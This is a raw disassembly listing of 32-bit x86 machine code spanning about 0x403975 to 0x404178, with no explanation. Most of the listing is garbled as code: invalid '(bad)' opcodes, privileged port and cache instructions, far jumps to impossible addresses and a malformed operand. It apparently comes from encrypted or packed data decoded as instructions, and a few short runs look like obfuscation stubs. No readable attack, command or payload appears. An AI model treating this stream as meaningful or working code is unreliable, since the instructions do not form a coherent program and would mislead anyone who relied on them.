  403975:	test   eax,0x9a66f61e
  40397a:	xchg   ebx,eax
  40397b:	js     0x4039f5
  40397d:	push   ebp
  40397e:	cmp    BYTE PTR [esi-0x522ceab3],bl
  403984:	test   BYTE PTR [esi-0x4f],0xc7
  403988:	popf   
  403989:	xchg   esi,eax
  40398a:	mov    edx,0xf431c85d
  40398f:	sbb    edi,DWORD PTR [ecx+0x5]
  403992:	fild   QWORD PTR [edx]
  403994:	lahf   
  403995:	push   0x1c377802
  40399a:	sbb    dh,0x9d
  40399d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40399e:	or     ah,BYTE PTR [esi-0x539b929e]
  4039a4:	cmc    
  4039a5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4039a6:	mov    ebp,0x489acd9e
  4039ab:	mov    DWORD PTR ds:0xb911370f,edx
  4039b1:	das    
  4039b2:	sub    BYTE PTR cs:[edi-0x5932d7ff],0x42
  4039ba:	mov    edx,0x4a22e6bc
  4039bf:	mov    al,ds:0xb4de11e9
  4039c4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4039c5:	fsubr  QWORD PTR [esp+ecx*2]
  4039c8:	jle    0x403a40
  4039ca:	sbb    BYTE PTR [eax],dl
  4039cc:	mov    bh,0xb7
  4039ce:	daa    
  4039cf:	dec    esi
  4039d0:	stc    
  4039d1:	ss sahf 
  4039d3:	pusha  
  4039d4:	sbb    bl,BYTE PTR [edi+0x6d799539]
  4039da:	mov    ch,0xd5
  4039dc:	out    0xd6,al
  4039de:	ins    BYTE PTR es:[edi],dx
  4039df:	mov    dh,0xa0
  4039e1:	xchg   edi,eax
  4039e2:	dec    ecx
  4039e3:	sahf   
  4039e4:	aas    
  4039e5:	sbb    eax,0x9e42fd3b
  4039ea:	std    
  4039eb:	push   esi
  4039ec:	fldcw  WORD PTR [eax]
  4039ee:	push   edi
  4039ef:	pushf  
  4039f0:	mul    dh
  4039f2:	fisubr WORD PTR [ecx]
  4039f4:	dec    edi
  4039f5:	fbstp  TBYTE PTR [edx-0x1d]
  4039f8:	jge    0x403a44
  4039fa:	sar    BYTE PTR [ecx-0x66],1
  4039fd:	sbb    bl,BYTE PTR [ebx-0x62]
  403a00:	sub    al,0xc2
  403a02:	popf   
  403a03:	add    ch,BYTE PTR [esi+edi*2]
  403a06:	jns    0x403a35
  403a08:	ret    
  403a09:	not    al
  403a0b:	jge    0x4039ab
  403a0d:	cmp    eax,0x4af3469f
  403a12:	int    0x6f
  403a14:	mov    esi,0xf9172364
  403a19:	jbe    0x4039bf
  403a1b:	ret    0x7a8d
  403a1e:	bound  ebx,QWORD PTR [edx-0xe0e2839]
  403a24:	pop    ebx
  403a25:	mov    edi,0x1de3a767
  403a2a:	sub    dl,BYTE PTR [edx+edx*8]
  403a2d:	add    BYTE PTR [ecx-0x54],bl
  403a30:	in     al,0x72
  403a32:	sub    al,0xf2
  403a34:	aaa    
  403a35:	push   ecx
  403a36:	push   eax
  403a37:	ja     0x403a42
  403a39:	adc    eax,DWORD PTR [edx+edi*8+0xb34a3ed]
  403a40:	ret    0xe8ed
  403a43:	imul   esi,DWORD PTR [esi+0x27d7d801],0x69
  403a4a:	push   ecx
  403a4b:	adc    DWORD PTR [edi+0x3],ebp
  403a4e:	push   ebx
  403a4f:	call   FWORD PTR [ecx-0x45]
  403a52:	jns    0x4039dd
  403a54:	push   ds
  403a55:	push   esp
  403a56:	fmul   DWORD PTR [ebx-0x48bb39f6]
  403a5c:	pop    esp
  403a5d:	cmp    DWORD PTR [ebx-0x6f32089a],ecx
  403a63:	and    BYTE PTR [esi-0x463b40b3],al
  403a69:	mov    dl,BYTE PTR [esi-0x406e515a]
  403a6f:	(bad)  
  403a70:	xor    edi,DWORD PTR [ebp-0x1c]
  403a73:	setns  BYTE PTR [esi-0x49]
  403a77:	push   ss
  403a78:	rcr    BYTE PTR fs:[ebx-0x24],1
  403a7c:	mov    bl,0x1b
  403a7e:	adc    al,0x1
  403a80:	mov    al,0x82
  403a82:	push   eax
  403a83:	out    0x45,eax
  403a85:	mov    ebx,0xa131b2d8
  403a8a:	xchg   edx,eax
  403a8b:	hlt    
  403a8c:	push   ds
  403a8d:	xchg   BYTE PTR [edx+0x6fdef10c],cl
  403a93:	retf   0xdb59
  403a96:	fdivr  DWORD PTR [edx-0x7d]
  403a99:	ret    
  403a9a:	cmp    eax,0xd9db0f31
  403a9f:	inc    ecx
  403aa0:	inc    ebx
  403aa1:	das    
  403aa2:	shl    dh,cl
  403aa4:	sub    al,BYTE PTR [esp+ebx*8]
  403aa7:	pop    edx
  403aa8:	cli    
  403aa9:	xchg   esp,eax
  403aaa:	mov    bh,0xca
  403aac:	pop    eax
  403aad:	sub    edx,DWORD PTR [eax+0x29443d77]
  403ab3:	mov    edi,esp
  403ab5:	and    eax,0x2621e0b7
  403aba:	push   esi
  403abb:	jg     0x403a49
  403abd:	lea    ebp,[ecx-0x57b08167]
  403ac3:	fsub   QWORD PTR [ecx+0x1c05ac4d]
  403ac9:	inc    ecx
  403aca:	jge    0x403b29
  403acc:	sar    BYTE PTR [ebp+0x3d],0x15
  403ad0:	jle    0x403a78
  403ad2:	jno    0x403b34
  403ad4:	xor    ebp,DWORD PTR ds:0xe22a72c5
  403ada:	imul   ebx,DWORD PTR [eax-0x5],0x58
  403ade:	outs   dx,BYTE PTR ds:[esi]
  403adf:	xchg   ebp,eax
  403ae0:	jecxz  0x403acb
  403ae2:	mov    ds:0x38e3299,eax
  403ae7:	or     dh,ch
  403ae9:	cwde   
  403aea:	lahf   
  403aeb:	imul   eax,DWORD PTR [edx-0x7c],0x458a6837
  403af2:	dec    DWORD PTR [edi]
  403af4:	mov    bh,0xd
  403af6:	jmp    0x403ade
  403af8:	inc    edx
  403af9:	add    BYTE PTR [ecx],dl
  403afb:	or     eax,0x42fd76
  403b00:	mov    ecx,DWORD PTR [ebp-0x10]
  403b03:	sub    DWORD PTR ds:0x42e124,0x77ef
  403b0d:	xor    al,0x47
  403b0f:	sub    al,0x37
  403b11:	and    DWORD PTR ds:0x42fcfd,0x33b1
  403b1b:	mov    BYTE PTR [ecx],al
  403b1d:	neg    DWORD PTR ds:0x42fcf5
  403b23:	mov    DWORD PTR [ebp-0x8],0xf89c8531
  403b2a:	jmp    0x403e8a
  403b2f:	fist   WORD PTR [esi+0x1]
  403b32:	cdq    
  403b33:	mov    cl,0x69
  403b35:	addr16 push edx
  403b37:	push   esi
  403b38:	and    DWORD PTR [ecx+0x5c498497],esi
  403b3e:	mov    ah,0xc5
  403b40:	push   ds
  403b41:	jo     0x403bb3
  403b43:	cmp    eax,0x8b70707d
  403b48:	fcomp  DWORD PTR [edx-0x78b3fe49]
  403b4e:	inc    ebp
  403b4f:	cmp    ch,BYTE PTR [edx+0xe]
  403b52:	fs add al,0xaa
  403b55:	ret    0x4f66
  403b58:	das    
  403b59:	fwait
  403b5a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403b5b:	pop    eax
  403b5c:	es mov bl,0x2a
  403b5f:	sub    ebp,DWORD PTR ds:0x71188920
  403b65:	icebp  
  403b66:	sbb    cl,BYTE PTR [esi]
  403b68:	out    dx,al
  403b69:	jmp    0x6b25960b
  403b6e:	and    eax,0x66c719bb
  403b73:	sbb    eax,0x1a90aa08
  403b78:	jbe    0x403be2
  403b7a:	jmp    0xce38bb8c
  403b7f:	test   eax,0x757f07c7
  403b84:	lea    ebx,[ebp-0x22]
  403b87:	push   0xb0face59
  403b8c:	cwde   
  403b8d:	bound  esp,QWORD PTR [ecx+0x406c1737]
  403b93:	rol    DWORD PTR [ebp-0x7ce1f580],1
  403b99:	lds    ebp,FWORD PTR [esi-0x31]
  403b9c:	retf   0x6a89
  403b9f:	and    DWORD PTR [esi],0x6a210521
  403ba5:	pushf  
  403ba6:	dec    ecx
  403ba7:	(bad)  
  403ba9:	ins    DWORD PTR es:[edi],dx
  403baa:	xchg   esi,eax
  403bab:	das    
  403bac:	pop    ds
  403bad:	jmp    0xd4aaff1a
  403bb2:	test   bl,dh
  403bb4:	jo     0x403c01
  403bb6:	or     eax,0xf8d2ebcf
  403bbb:	xchg   esi,eax
  403bbc:	stos   BYTE PTR es:[edi],al
  403bbd:	push   ds
  403bbe:	push   es
  403bbf:	add    al,0xa4
  403bc1:	imul   eax,DWORD PTR [edx],0xffffffcd
  403bc4:	in     al,dx
  403bc5:	shr    DWORD PTR [esi],0x28
  403bc8:	hlt    
  403bc9:	repnz xor ax,0x543a
  403bce:	or     DWORD PTR [esi+0x76],ecx
  403bd1:	shl    BYTE PTR [ecx],cl
  403bd3:	(bad)  
  403bd4:	data16 and BYTE PTR fs:[edi-0x4163f001],dl
  403bdc:	mov    esi,0xd1de7c0d
  403be1:	ins    DWORD PTR es:[edi],dx
  403be2:	(bad)
  403be6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403be7:	push   0x4f
  403be9:	jno    0x403b73
  403beb:	rol    DWORD PTR [ecx-0x4e],0xfe
  403bef:	rcr    esp,1
  403bf1:	out    0x8f,al
  403bf3:	fcom   QWORD PTR [esi+eax*2+0x7760f9b2]
  403bfa:	xor    al,dh
  403bfc:	int3   
  403bfd:	jns    0x403bb1
  403bff:	ss (bad) 
  403c01:	test   cl,cl
  403c03:	pop    esp
  403c04:	sahf   
  403c05:	and    esp,DWORD PTR [ecx+0x1231524e]
  403c0b:	xor    ebp,esp
  403c0d:	pop    ds
  403c0e:	les    ecx,FWORD PTR ds:0xf40127d
  403c14:	fcmovnbe st,st(7)
  403c16:	mov    dl,0x87
  403c18:	add    ecx,DWORD PTR [ecx+0x4a738a60]
  403c1e:	xor    ebp,esp
  403c20:	mov    bh,0x96
  403c22:	es inc eax
  403c24:	mul    dl
  403c26:	add    bl,BYTE PTR [esi+0x22]
  403c29:	xchg   edx,eax
  403c2a:	test   DWORD PTR ds:0x6f6c0e46,0x2efb589c
  403c34:	mov    esp,0x75afe749
  403c39:	sbb    al,BYTE PTR [eax+eax*2+0xb24ea79]
  403c40:	daa    
  403c41:	cs nop
  403c43:	mov    ds:0x89694798,eax
  403c48:	pop    ds
  403c49:	test   al,0x84
  403c4b:	inc    esp
  403c4c:	sub    DWORD PTR [eax-0x53b00eb0],edi
  403c52:	(bad)  [eax+ecx*1-0x17]
  403c56:	leave  
  403c57:	push   0x250726b6
  403c5c:	loop   0x403c7d
  403c5e:	fwait
  403c5f:	dec    ebx
  403c60:	cwde   
  403c61:	test   al,0x46
  403c63:	inc    eax
  403c64:	mov    ch,BYTE PTR [esi+0x10]
  403c67:	les    edi,FWORD PTR [edi-0x1c]
  403c6a:	(bad)  
  403c6b:	adc    DWORD PTR [ecx-0x4c],edx
  403c6e:	push   ds
  403c6f:	aad    0xf7
  403c71:	xchg   DWORD PTR [ebp-0x769a797a],edx
  403c77:	call   0x38e0:0x78f6fb6b
  403c7e:	or     al,BYTE PTR [esi]
  403c80:	dec    bl
  403c82:	mov    eax,ds:0xca7a14e1
  403c87:	sbb    al,0xe7
  403c89:	or     BYTE PTR [ebx],dl
  403c8b:	and    al,0x61
  403c8d:	in     eax,dx
  403c8e:	mov    edx,0xec12681d
  403c93:	ss sbb esi,0x1d7f61f4
  403c9a:	fcomp  QWORD PTR [ebp+0xdc3304d]
  403ca0:	xchg   edi,eax
  403ca1:	out    0xe0,al
  403ca3:	das    
  403ca4:	xor    al,0x46
  403ca6:	fs jl  0x403cc4
  403ca9:	mov    dl,0x1c
  403cab:	ss xchg ecx,eax
  403cad:	mov    eax,ds:0x182579b6
  403cb2:	mov    ecx,cs
  403cb4:	push   DWORD PTR [eax+0x75]
  403cb7:	cwde   
  403cb8:	xchg   esp,eax
  403cb9:	ror    DWORD PTR [edi+0x17],0xe
  403cbd:	fmul   st(2),st
  403cbf:	popa   
  403cc0:	leave  
  403cc1:	push   esi
  403cc2:	jae    0x403d2e
  403cc4:	dec    eax
  403cc5:	push   esp
  403cc6:	pop    edx
  403cc7:	push   es
  403cc8:	sbb    eax,0xfbfce39b
  403ccd:	xchg   ebp,eax
  403cce:	jmp    0x5b29f8af
  403cd3:	push   ebp
  403cd4:	or     ebx,ebp
  403cd6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403cd7:	fild   DWORD PTR [ebp+0x5c04020f]
  403cdd:	cli    
  403cde:	mov    al,BYTE PTR [ecx+0x5e]
  403ce1:	lods   al,BYTE PTR ds:[esi]
  403ce2:	mov    bh,dl
  403ce4:	rcl    DWORD PTR ds:0xb57d58bf,0x88
  403ceb:	loope  0x403d07
  403ced:	out    dx,eax
  403cee:	jae    0x403d45
  403cf0:	cmc    
  403cf1:	mov    esp,0x5a1df1f0
  403cf6:	(bad)  
  403cf7:	push   edi
  403cf8:	sbb    al,0xed
  403cfa:	leave  
  403cfb:	cmp    esp,DWORD PTR [eax+eax*2+0x13]
  403cff:	jle    0x403c9c
  403d01:	out    dx,al
  403d02:	enter  0xa0a8,0xf
  403d06:	lea    eax,[edx+0x1a]
  403d09:	das    
  403d0a:	ja     0x403d07
  403d0c:	xchg   edi,eax
  403d0d:	sti    
  403d0e:	add    edx,DWORD PTR [eax-0x3d7a6687]
  403d14:	rol    eax,cl
  403d16:	jg     0x403d43
  403d18:	in     al,dx
  403d19:	dec    esi
  403d1a:	jge    0x403d14
  403d1c:	and    esi,ebx
  403d1e:	jmp    0x908c6d26
  403d23:	in     al,dx
  403d24:	fidiv  DWORD PTR [edi+0x4fe418a]
  403d2a:	(bad)  
  403d2b:	lar    ecx,WORD PTR [edi+0x34]
  403d2f:	popf   
  403d30:	or     esp,DWORD PTR [edx-0x75ee993b]
  403d36:	or     al,0x4b
  403d38:	jnp    0x403ce9
  403d3a:	jle    0x403da6
  403d3c:	daa    
  403d3d:	xlat   BYTE PTR ds:[ebx]
  403d3e:	mov    ecx,0xbdead235
  403d43:	bound  esp,QWORD PTR [eax]
  403d45:	sbb    bl,BYTE PTR [edx]
  403d47:	mov    BYTE PTR [ebx-0x7a],cl
  403d4a:	cmp    BYTE PTR [edx],0xb5
  403d4d:	(bad)  
  403d4e:	stc    
  403d4f:	xor    edi,DWORD PTR [edi+0x16]
  403d52:	call   eax
  403d54:	mov    cl,0xc7
  403d56:	in     al,dx
  403d57:	imul   ebx,esp,0x38790ad
  403d5d:	fwait
  403d5e:	daa    
  403d5f:	push   esp
  403d60:	pop    esi
  403d61:	or     dl,BYTE PTR [edx]
  403d63:	clc    
  403d64:	aas    
  403d65:	in     eax,0xe9
  403d67:	shl    esi,1
  403d69:	popa   
  403d6a:	xchg   edx,eax
  403d6b:	loope  0x403d3f
  403d6d:	or     al,BYTE PTR [esi]
  403d6f:	mov    al,ds:0x5b0d4e52
  403d74:	or     al,0xcb
  403d76:	mov    esi,0xbdc474fa
  403d7b:	inc    ecx
  403d7c:	into   
  403d7d:	pop    ss
  403d7e:	(bad)  
  403d80:	stos   BYTE PTR es:[edi],al
  403d81:	popf   
  403d82:	mov    bh,0xd0
  403d84:	shl    DWORD PTR [edi+esi*4],1
  403d87:	dec    ebx
  403d88:	jns    0x403da8
  403d8a:	ins    DWORD PTR es:[edi],dx
  403d8b:	jo     0x403d54
  403d8d:	sahf   
  403d8e:	mov    ebp,0x5bb205c
  403d93:	loop   0x403e0d
  403d95:	cmp    eax,0x50657533
  403d9a:	pop    edx
  403d9b:	cmp    eax,0x9598ad79
  403da0:	pop    es
  403da1:	rcl    DWORD PTR [ecx],cl
  403da3:	sbb    al,0xcf
  403da5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403da6:	js     0x403da4
  403da8:	or     al,0x24
  403daa:	and    ah,cl
  403dac:	adc    esi,esi
  403dae:	dec    esp
  403daf:	aaa    
  403db0:	imul   ecx,DWORD PTR [edi-0x1ee81006],0xbca56bb8
  403dba:	(bad)
  403dbd:	dec    esp
  403dbe:	loop   0x403e1d
  403dc0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403dc1:	popf   
  403dc2:	dec    edx
  403dc3:	mov    cl,0x9c
  403dc5:	cmp    ebp,DWORD PTR [edx-0x3]
  403dc8:	and    edx,DWORD PTR [eax]
  403dca:	mov    BYTE PTR [edx+0x24297c9e],ah
  403dd0:	popf   
  403dd1:	js     0x403d70
  403dd3:	xor    edi,0xcdbabbd7
  403dd9:	jmp    0x7fc1:0xb31d562e
  403de0:	dec    BYTE PTR [ebx+0x51]
  403de3:	dec    ecx
  403de4:	xchg   ecx,eax
  403de5:	ss sub eax,0x625389d7
  403deb:	sahf   
  403dec:	shr    BYTE PTR [ebx+0x292dfced],1
  403df2:	int3   
  403df3:	pop    ds
  403df4:	push   ebp
  403df5:	xlat   BYTE PTR ds:[ebx]
  403df6:	aad    0xe8
  403df8:	or     eax,0x396a2f5a
  403dfd:	mov    ebp,edx
  403dff:	jb     0x403d9d
  403e01:	or     eax,0xc1664a11
  403e06:	push   esp
  403e07:	cdq    
  403e08:	into   
  403e09:	and    dh,BYTE PTR [ecx+0x4faba0b4]
  403e0f:	outs   dx,DWORD PTR ds:[esi]
  403e10:	js     0x403dd4
  403e12:	push   edx
  403e13:	inc    ebx
  403e14:	inc    esp
  403e15:	(bad)  
  403e16:	idiv   DWORD PTR [ecx]
  403e18:	cmp    ah,dl
  403e1a:	dec    eax
  403e1b:	push   0x6e
  403e1d:	cwde   
  403e1e:	ins    BYTE PTR es:[edi],dx
  403e1f:	jl     0x403e3a
  403e21:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403e22:	sbb    dl,dh
  403e24:	jg     0x403e50
  403e26:	jmp    0x8c2f:0xb5c61f75
  403e2d:	push   edi
  403e2e:	adc    al,0x55
  403e30:	stc    
  403e31:	and    eax,0x46a09bd0
  403e36:	rcl    DWORD PTR ds:0xdd297644,cl
  403e3c:	push   esi
  403e3d:	int    0x2b
  403e3f:	lock mov ch,0x3f
  403e42:	lahf   
  403e43:	std    
  403e44:	lods   eax,DWORD PTR ds:[esi]
  403e45:	invd   
  403e47:	adc    eax,0x228121db
  403e4c:	fs mov dl,al
  403e4f:	mov    edx,0x523aff0a
  403e54:	div    BYTE PTR [eax+0x1583a018]
  403e5a:	jg     0x403def
  403e5c:	mov    eax,ds:0xe3056c3b
  403e61:	cmc    
  403e62:	sub    DWORD PTR [ebx],esi
  403e64:	call   0x7496:0x33ca8158
  403e6b:	jo     0x403e31
  403e6d:	aaa    
  403e6e:	test   BYTE PTR [edi-0x6],0xda
  403e72:	dec    ecx
  403e73:	scas   eax,DWORD PTR es:[edi]
  403e74:	lods   eax,DWORD PTR ds:[esi]
  403e75:	cmp    esp,DWORD PTR [ebx-0x310cbc3d]
  403e7b:	add    eax,0xadeb9807
  403e80:	arpl   WORD PTR [ebx-0x19],di
  403e83:	cmp    dl,BYTE PTR [ecx]
  403e85:	repz rcl dh,1
  403e88:	adc    eax,0xf045c71a
  403e8d:	xor    BYTE PTR [ebp+0x458bf89c],al
  403e93:	clc    
  403e94:	mov    ecx,0x7510855
  403e99:	push   esi
  403e9a:	xor    eax,ecx
  403e9c:	mov    esi,DWORD PTR ds:0x42e11c
  403ea2:	adc    DWORD PTR ds:0x42e70f,esi
  403ea8:	mov    esi,0x32729c
  403ead:	add    eax,esi
  403eaf:	mov    DWORD PTR ds:0x42fd72,0x1a92
  403eb9:	jmp    0x40423a
  403ebe:	mov    dl,BYTE PTR [ebp-0x1]
  403ec1:	mov    DWORD PTR ds:0x42fd05,0x5bb3
  403ecb:	mov    BYTE PTR [ebp+eax*1-0x58],dl
  403ecf:	mov    DWORD PTR ds:0x42e6ef,0x7752
  403ed9:	jmp    0x404239
  403ede:	jge    0x403ed6
  403ee0:	retf   0xf1c4
  403ee3:	in     al,0x15
  403ee5:	icebp  
  403ee6:	ss mov esp,0x2f691c35
  403eec:	sub    eax,0x701b82cd
  403ef1:	jo     0x403f30
  403ef3:	jge    0x403f65
  403ef5:	jo     0x403f1d
  403ef7:	imul   ecx,DWORD PTR [esi-0x6226764c],0x7
  403efe:	(bad)  
  403f00:	xor    DWORD PTR [eax-0x759aeea],ebx
  403f06:	inc    eax
  403f07:	mov    WORD PTR [eax],gs
  403f09:	fnstenv [ecx-0x56]
  403f0c:	pop    es
  403f0d:	or     al,0x7d
  403f0f:	add    BYTE PTR [ecx+0x1],bh
  403f12:	(bad)  
  403f13:	mov    ecx,0x5c602b72
  403f18:	test   al,0xa3
  403f1a:	inc    eax
  403f1b:	cmp    BYTE PTR ds:0xd6f27fe8,ch
  403f21:	lahf   
  403f22:	xchg   edx,eax
  403f23:	lahf   
  403f24:	xchg   eax,esi
  403f26:	das    
  403f27:	les    eax,FWORD PTR [edi]
  403f29:	and    BYTE PTR [edx-0x14],al
  403f2c:	mov    ch,0xd
  403f2e:	dec    ebx
  403f2f:	sbb    cl,BYTE PTR [edx+0x4fc660a8]
  403f35:	clc    
  403f36:	sbb    al,0x63
  403f38:	in     eax,dx
  403f39:	cdq    
  403f3a:	jne    0x403fa2
  403f3c:	inc    ebp
  403f3d:	(bad)  
  403f3f:	std    
  403f40:	jne    0x403f41
  403f42:	js     0x403f94
  403f44:	mov    cl,0x9b
  403f46:	out    0x42,al
  403f48:	scas   eax,DWORD PTR es:[edi]
  403f49:	adc    eax,ebp
  403f4b:	jmp    ebp
  403f4d:	push   ebp
  403f4e:	scas   al,BYTE PTR es:[edi]
  403f4f:	sub    al,0xd8
  403f51:	test   eax,0x832b5b69
  403f56:	pushf  
  403f57:	xor    BYTE PTR [edx-0x66b24c52],ch
  403f5d:	mov    eax,0x94af054e
  403f62:	adc    ah,bh
  403f64:	dec    edi
  403f65:	sbb    BYTE PTR [edi+0x53],0xe7
  403f69:	cld    
  403f6a:	sub    BYTE PTR [eax+0x20d0d075],0x6d
  403f71:	cmc    
  403f72:	sbb    esp,DWORD PTR [ebp+0x46]
  403f75:	add    ah,BYTE PTR [ebx]
  403f77:	mov    ds:0x55c414db,al
  403f7c:	fdivr  QWORD PTR [edx+0x71f1bc1c]
  403f82:	sbb    ebp,ecx
  403f84:	call   FWORD PTR [eax+0x45d85133]
  403f8a:	fistp  QWORD PTR [edi-0x21]
  403f8d:	stos   BYTE PTR es:[edi],al
  403f8e:	dec    edx
  403f8f:	xor    dh,cl
  403f91:	xor    esp,DWORD PTR [eax]
  403f93:	mov    ebp,0x8d123749
  403f98:	push   ss
  403f99:	jo     0x403fd8
  403f9b:	fsubr  st(6),st
  403f9d:	gs into 
  403f9f:	mov    edx,0x90640614
  403fa4:	cli    
  403fa5:	xlat   BYTE PTR ds:[ebx]
  403fa6:	repnz cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403fa8:	call   0x9d7a:0x27b8ad92
  403faf:	ss mov bl,0x26
  403fb2:	and    al,0x63
  403fb4:	jp     0x403f44
  403fb6:	mov    ds:0x4bc17a4e,al
  403fbb:	mov    ebp,0xb6820d9b
  403fc0:	xlat   BYTE PTR ds:[ebx]
  403fc1:	sti    
  403fc2:	mov    dh,0xd9
  403fc4:	sahf   
  403fc5:	pop    ss
  403fc6:	dec    eax
  403fc7:	xchg   BYTE PTR ds:0xad5733e4,bh
  403fcd:	fild   WORD PTR [ebp-0x6e]
  403fd0:	inc    ebx
  403fd1:	out    dx,eax
  403fd2:	cdq    
  403fd3:	mov    ss,esi
  403fd5:	mov    ?,ebx
  403fd7:	jne    0x403f9f
  403fd9:	pop    ecx
  403fda:	test   al,0x2a
  403fdc:	mov    DWORD PTR [ebp+0x3e],ecx
  403fdf:	xlat   BYTE PTR ds:[ebx]
  403fe0:	call   0x4084:0xea83485f
  403fe7:	jbe    0x403ff7
  403fe9:	jns    0x403fd9
  403feb:	or     ch,bl
  403fed:	das    
  403fee:	loope  0x403fb3
  403ff0:	sbb    DWORD PTR [edx+0x3ea88e98],eax
  403ff6:	mov    al,ds:0x5aeced68
  403ffb:	push   ds
  403ffc:	aaa    
  403ffd:	xlat   BYTE PTR ds:[ebx]
  403ffe:	push   ecx
  403fff:	push   edi
  404000:	es mov bh,0xcf
  404003:	and    DWORD PTR [ebp-0x17],eax
  404006:	pop    eax
  404007:	mov    ds:0xc0521036,eax
  40400c:	sub    al,0x6d
  40400e:	repz push eax
  404010:	add    BYTE PTR [ebp-0x4c],ch
  404013:	xchg   edx,eax
  404014:	(bad)  
  404015:	cwde   
  404016:	mov    ds:0x5306b9b4,eax
  40401b:	(bad)  
  40401c:	and    ecx,DWORD PTR [ecx-0x2a]
  40401f:	mov    eax,ds:0x149cec06
  404024:	jmp    0x403fe8
  404026:	cli    
  404027:	push   0xd9b5bb72
  40402c:	loop   0x403ffc
  40402e:	(bad)  
  40402f:	xor    BYTE PTR [eax],bh
  404031:	lock lods al,BYTE PTR ds:[esi]
  404033:	jp     0x403fbf
  404035:	push   0x11
  404037:	jo     0x403ff2
  404039:	(bad)  
  40403a:	lea    edx,[ebp-0x5192e008]
  404040:	(bad)  
  404042:	ja     0x40402a
  404044:	test   eax,0xb2294a41
  404049:	lods   eax,DWORD PTR ds:[esi]
  40404a:	rcl    ebp,1
  40404c:	mov    edi,cs
  40404e:	cli    
  40404f:	pop    ss
  404050:	sbb    al,0x6
  404052:	cmp    DWORD PTR [esi+ebx*1-0xd],esp
  404056:	(bad)  
  404057:	stc    
  404058:	scas   al,BYTE PTR es:[edi]
  404059:	aas    
  40405a:	sbb    eax,0xfcbfa72c
  40405f:	sbb    DWORD PTR [edi],edx
  404061:	pusha  
  404062:	outs   dx,BYTE PTR ds:[esi]
  404063:	imul   ebx,ebx,0xac165b11
  404069:	push   esi
  40406a:	lea    eax,[edx+esi*1]
  40406d:	or     al,0x46
  40406f:	fwait
  404070:	in     eax,0xdb
  404072:	pop    esp
  404073:	repnz and bl,BYTE PTR [eax]
  404076:	or     al,0xdf
  404078:	sbb    esi,DWORD PTR [esi+eiz*4+0x553545fa]
  40407f:	xor    esp,DWORD PTR [ebx-0x65]
  404082:	aam    0x92
  404084:	inc    esp
  404085:	dec    ebx
  404086:	mov    ecx,0xd5977a41
  40408b:	or     BYTE PTR [edx],ah
  40408d:	addr16 or eax,0x70b59847
  404093:	pop    edx
  404094:	and    al,0x3c
  404096:	jle    0x404043
  404098:	iret   
  404099:	cmp    BYTE PTR [ecx+0x1681d689],bh
  40409f:	and    al,0x3e
  4040a1:	loopne 0x4040ec
  4040a3:	sbb    al,0xe8
  4040a5:	mov    ch,ah
  4040a7:	adc    ch,BYTE PTR [edi+0xaed0d9]
  4040ad:	dec    ecx
  4040ae:	mov    al,0xf2
  4040b0:	dec    esp
  4040b1:	xchg   bh,cl
  4040b3:	das    
  4040b4:	and    al,0xc2
  4040b6:	jne    0x4040cd
  4040b8:	mov    edx,0x9ccb9268
  4040bd:	aam    0x31
  4040bf:	sbb    eax,0x69abb3d9
  4040c4:	ret    
  4040c5:	ds dec edx
  4040c7:	push   0xffffff81
  4040c9:	rol    DWORD PTR [edx-0x52],cl
  4040cc:	push   es
  4040cd:	mov    esp,0xa5dc5f5a
  4040d2:	out    0xd8,al
  4040d4:	mov    cl,0x0
  4040d6:	add    al,0xc
  4040d8:	das    
  4040d9:	inc    esi
  4040da:	popa   
  4040db:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4040dc:	(bad)  [ebx-0x671fb0c6]
  4040e2:	jl     0x4040ce
  4040e4:	shl    ebx,0x2d
  4040e7:	inc    ebx
  4040e8:	icebp  
  4040e9:	inc    ecx
  4040ea:	mov    al,ds:0xf0d52025
  4040ef:	in     eax,dx
  4040f0:	pop    ss
  4040f1:	and    al,0x10
  4040f3:	data16 es or al,0x51
  4040f7:	fwait
  4040f8:	mov    edi,0xa9929c14
  4040fd:	sub    eax,0x99cf0226
  404102:	fimul  WORD PTR [ecx+0x236f8816]
  404108:	aas    
  404109:	jns    0x404108
  40410b:	fcmove st,st(2)
  40410d:	retf   0xaaf1
  404110:	push   es
  404111:	dec    ebp
  404112:	popa   
  404113:	sbb    dh,dl
  404115:	std    
  404116:	cmc    
  404117:	not    eax
  404119:	cmp    bl,bl
  40411b:	mov    bl,0x90
  40411d:	lds    ebx,FWORD PTR [esp+eiz*4+0x502918e8]
  404124:	fiadd  WORD PTR [edx-0x70de808e]
  40412a:	rcr    edi,1
  40412c:	dec    edx
  40412d:	xchg   ebp,eax
  40412e:	inc    esi
  40412f:	pop    edx
  404130:	mov    dh,0x90
  404132:	lods   al,BYTE PTR ds:[esi]
  404133:	add    BYTE PTR [esi],cl
  404135:	and    DWORD PTR [esi+0x73],eax
  404138:	lods   al,BYTE PTR ds:[esi]
  404139:	aam    0x8
  40413b:	sbb    dh,ah
  40413d:	xchg   ebx,eax
  40413e:	mov    esp,eax
  404140:	dec    ecx
  404141:	cli    
  404142:	leave  
  404143:	rcl    BYTE PTR [edi],0x7d
  404146:	xchg   BYTE PTR [ebp+0x26],dh
  404149:	sub    dl,cl
  40414b:	not    edi
  40414d:	adc    BYTE PTR [edi-0x54],dh
  404150:	enter  0x65ff,0xd
  404154:	js     0x4040d7
  404156:	imul   ebp,DWORD PTR [edi+eax*1],0xcab1d9c9
  40415d:	xchg   esp,eax
  40415e:	mov    DWORD PTR [esi-0x502ed4b9],edi
  404164:	ins    BYTE PTR es:[edi],dx
  404165:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404166:	jo     0x4041ae
  404168:	sub    BYTE PTR [edi-0x4d],al
  40416b:	xchg   esp,eax
  40416c:	xchg   ebp,eax
  40416d:	stos   BYTE PTR es:[edi],al
  40416e:	and    DWORD PTR [ebx],ebp
  404170:	inc    eax
  404171:	fstp   DWORD PTR [ebx+edx*8]
  404174:	xchg   BYTE PTR [ecx],bl
  404176:	dec    esi
  404177:	aaa    
  404178:	mov    edi,0x85276d1c
